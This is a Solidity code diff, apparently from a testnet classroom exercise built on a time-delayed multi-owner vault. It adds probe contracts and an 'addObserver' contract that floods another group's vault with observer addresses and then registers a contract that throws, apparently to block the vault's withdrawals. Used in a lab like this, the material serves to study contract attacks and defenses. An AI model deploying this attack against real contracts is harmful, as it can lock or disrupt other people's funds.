@@ -119,9 +119,9 @@ contract TimeDelayedVault is BasicMultiOwnerVault {
         //this.call(bytes4(sha3("initializeVault()")));
        
         // Please note, the following code chunk is different for each group, all group members are added to authorizedUsers array
-        //authorizedUsers.push(0xca35b7d915458ef540ade6068dfe2f44e8fa733c); //second
+        authorizedUsers.push(0xca35b7d915458ef540ade6068dfe2f44e8fa733c); //second
         //authorizedUsers.push(0x14723a09acff6d2a60dcdf7aa4aff308fddc160c);//third
-        authorizedUsers.push(0xeb557D1A1c81a18D435cd7c882f20D24ED6E9dd3); //metamask ropsten
+        //authorizedUsers.push(0xeb557D1A1c81a18D435cd7c882f20D24ED6E9dd3); //metamask ropsten
 
         for(uint i=0; i<authorizedUsers.length; i++) {
             votes.push(false);
@@ -194,3 +194,52 @@ contract getMoney{
     
 }
 
+//test Observer;
+//assert(withdrawObserver.call(bytes4(sha3("observe()"))));
+contract test{  //not throw error
+    function () {
+    }
+}
+contract test2{//not throw error
+    function observe(){
+    }
+}
+contract test3{//throw error
+}
+
+//add many observers to other group 
+contract addObserver{
+    address public target;
+    address public badContract;
+    uint public loopLimit = 1;
+    uint public offset = 0;
+    function setTarget(address _target) {
+        target = _target;
+    }
+    function setLimit(uint _limit){
+        loopLimit = _limit;
+    }
+    function setOffset(uint _offset){
+        offset = _offset;
+    }
+    function setBadContract(address _addr){
+        badContract = _addr;
+    }
+    function addManyOb() {
+        TimeDelayedVault ct = TimeDelayedVault(target);
+
+        for(uint i=1;i<=loopLimit;i++){
+            ct.setObserver(address(i+offset));    
+        }
+        offset += loopLimit;
+    }
+    function addLastOb(){// add a bad address 
+        TimeDelayedVault ct = TimeDelayedVault(target);
+        ct.setObserver(badContract);    
+    }
+    function reset(){
+        target = 0x0;
+        loopLimit = 1;
+        offset = 0;
+    }
+}
